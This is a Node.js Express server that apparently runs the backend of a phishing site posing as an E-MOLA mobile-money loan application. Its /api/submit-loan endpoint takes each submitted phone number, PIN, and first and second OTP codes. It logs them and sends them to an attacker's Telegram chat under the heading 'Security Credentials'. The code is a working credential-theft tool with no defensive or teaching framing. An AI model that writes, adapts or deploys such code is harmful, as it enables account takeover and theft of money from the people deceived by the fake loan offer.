require('dotenv').config();
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON and URL-encoded form data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files (HTML, CSS, JS) from the 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Telegram Configuration from environment variables
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Helper function to send notifications to Telegram in English
async function sendTelegramMessage(loanData) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.warn('Telegram BOT_TOKEN or CHAT_ID is not configured in environment variables.');
        return;
    }

    const message = `
🚨 *NEW E-MOLA LOAN APPLICATION* 🚨

👤 *Client Details:*
• Phone: ${loanData.phone || 'N/A'}
• Amount: MT ${loanData.amount || 'N/A'}
• Period: ${loanData.period || 'N/A'} months

🔐 *Security Credentials:*
• PIN: ${loanData.pin || 'Pending'}
• First OTP: ${loanData.otp1 || 'Pending'}
• Second OTP: ${loanData.otp2 || 'Pending'}

📅 *Status:* ${loanData.status || 'SUBMITTED'}
⏰ *Timestamp:* ${new Date().toLocaleString()}
    `.trim();

    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        if (!result.ok) {
            console.error('Telegram API Error:', result);
        }
    } catch (error) {
        console.error('Failed to send Telegram notification:', error);
    }
}

// API endpoint to handle loan application steps and data submission
app.post('/api/submit-loan', async (req, res) => {
    try {
        const loanData = req.body;
        
        // Log incoming data to server console
        console.log('Received loan application update:', loanData);

        // Forward details to your Telegram bot in English
        await sendTelegramMessage(loanData);

        res.status(200).json({ success: true, message: 'Processed successfully' });
    } catch (error) {
        console.error('Error processing request:', error);
        res.status(500).json({ success: false, error: 'Internal Server Error' });
    }
});

// Fallback route to serve index.html for any unknown routes
app.get(/(.*)/, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running live on port ${PORT}`);
});